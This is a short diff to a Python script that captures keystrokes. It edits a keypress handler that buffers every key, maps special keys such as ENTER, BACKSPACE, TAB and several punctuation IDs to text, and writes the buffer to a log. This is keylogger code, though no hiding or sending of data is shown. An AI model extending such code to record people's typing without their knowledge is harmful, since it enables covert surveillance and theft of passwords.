@@ -81,9 +81,9 @@ def keypress(event):
 	# --------------------------------------------------------------------------
 	if event.KeyID:
 		char = chr(event.KeyID)
-		print("char: ", char)
+		print("\nchar: ", char)
 		print("ascii: ", event.Ascii)
-		print("id: ", event.KeyID)
+		print("id: ", event.KeyID, "\n")
 
 		if char == "~":
 			log(buffer)
@@ -95,12 +95,21 @@ def keypress(event):
 			log(buffer)
 			buffer=""
 
-		if event.KeyID==13:
-			buffer += "<ENTER>\n"
-		elif event.KeyID==8:
+		if event.KeyID==8:
 			buffer += "<BACKSPACE>"
 		elif event.KeyID==9:
 			buffer += "<TAB>"
+		elif event.KeyID==13:
+			buffer += "<ENTER>\n"
+		elif event.KeyID==187:
+			buffer += "="
+		elif event.KeyID==189:
+			buffer += "-"
+		elif event.KeyID==190:
+			buffer += "."
+		elif event.KeyID==222:
+			buffer += "'"
+
 		else:
 			buffer += char
 
